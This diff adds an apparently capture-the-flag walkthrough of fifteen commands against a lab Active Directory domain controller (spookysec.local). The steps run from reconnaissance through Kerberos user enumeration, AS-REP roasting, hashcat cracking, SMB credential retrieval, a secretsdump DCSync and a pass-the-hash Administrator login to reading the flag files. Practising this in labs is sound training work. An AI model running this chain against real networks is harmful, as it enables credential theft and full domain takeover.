@@ -1,0 +1,15 @@
+1 - nmap -A 10.10.231.53
+2 - enum4linux 10.10.231.53
+3 - echo "10.10.231.53 spookysec.local" | tee -a /etc/hosts
+4 - userenum --dc 10.10.231.53 -d spookysec.local -t 20 userlist.txt
+5 - python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -usersfile user.txt -dc-ip 10.10.231.53 spookysec.local/ -o kerberos_result
+6 - hashcat --help | grep "Kerberos"
+7 - hashcat -m 18200 kerberos_result passwordlist.txt
+8 - smbclient -L \\10.10.231.53 -U svc-admin
+9 - smbclient \\\\10.10.231.53\\backup -U svc-admin
+10 - cat backup_credentials.txt | base64 -d
+11 - python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup@spookysec.local -outputfile secrets_dump
+12 - evil-winrm -i 10.10.231.53 -u Administrator -H "HASH"
+13 - type C:\Users\svc-admin\Desktop\user.txt.txt
+14 - type C:\Users\backup\Desktop\PrivEsc.txt
+15 - type C:\Users\Administrator\Desktop\root.txt
